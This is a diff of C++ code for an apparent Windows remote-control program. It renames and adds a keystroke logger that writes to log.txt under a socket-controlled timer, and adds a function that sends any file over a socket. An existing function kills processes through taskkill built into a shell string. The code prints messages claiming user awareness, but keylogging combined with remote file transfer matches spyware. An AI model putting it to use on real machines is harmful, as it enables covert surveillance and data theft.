@@ -18,7 +18,7 @@ void Computer::reset() {
         #error "Operating system is not supported"
     #endif
 }
-void Computer::keyLogger() {
+void keyboardMonitor() {
     char c;
     std::ofstream log;
     log.open("log.txt", std::ios::app);
@@ -130,6 +130,26 @@ void stopAfterDelay(SOCKET serverSocket) {
     }
 }
 
+void Computer::keyLogger(SOCKET serverSocket) {
+    std::cout << "Starting keyboard input monitor...\n";
+    std::cout << "All keyboard input will be displayed in this window.\n";
+    std::cout << "This program runs with user awareness for input testing.\n";
+    std::cout << "Program will stop after 10 seconds or press ESC to exit.\n\n";
+
+    // Start monitoring thread
+    std::thread monitorThread(keyboardMonitor);
+    
+    // Create another thread to stop monitoring after 10 seconds
+    std::thread timerThread(stopAfterDelay, serverSocket);
+    // Wait for monitoring thread to finish
+    monitorThread.join();
+    
+    // Wait for timer thread to finish
+    timerThread.join();
+    running = true;
+
+}
+
 void Computer::listApp() {
     std::vector<std::wstring> applications;
     HKEY hKey;
@@ -180,6 +200,54 @@ void Computer::stopApp(std::string name) {
     std::string command = "taskkill /IM \"" + name + "\" /F";
     system(command.c_str());
 }
+
+void Computer::sendFile(SOCKET clientSocket, const std::string& filePath) {
+    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file." << std::endl;
+        return;
+    }
+
+    // Get file size
+    std::streamsize fileSize = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Send file info header: "SendFile: filename filesize"
+    std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
+    std::string fileHeader = "SendFile: " + filename + " " + std::to_string(fileSize);
+    send(clientSocket, fileHeader.c_str(), fileHeader.size(), 0);
+
+    // Wait for confirmation from the receiver
+    char ackBuffer[10];
+    recv(clientSocket, ackBuffer, sizeof(ackBuffer), 0);
+
+    // Send file contents in chunks
+    char buffer[BUFFER_SIZE];
+    std::streamsize totalSent = 0;
+    while (file) {
+        file.read(buffer, BUFFER_SIZE);
+        std::streamsize bytesToSend = file.gcount();
+
+        int bytesSent = 0;
+        while (bytesSent < bytesToSend) {
+            int sent = send(clientSocket, buffer + bytesSent, bytesToSend - bytesSent, 0);
+            if (sent == SOCKET_ERROR) {
+                std::cerr << "Error sending file." << std::endl;
+                return;
+            }
+            bytesSent += sent;
+        }
+        totalSent += bytesSent;
+    }
+
+    // Send end-of-file signal
+    std::string endSignal = "FileEnd";
+    send(clientSocket, endSignal.c_str(), endSignal.size(), 0);
+
+    file.close();
+    std::cout << "File sent successfully. Total bytes sent: " << totalSent << std::endl;
+}
+
 // void listService();
 // void startService(std::string name);
 // void stopService(std::string name);
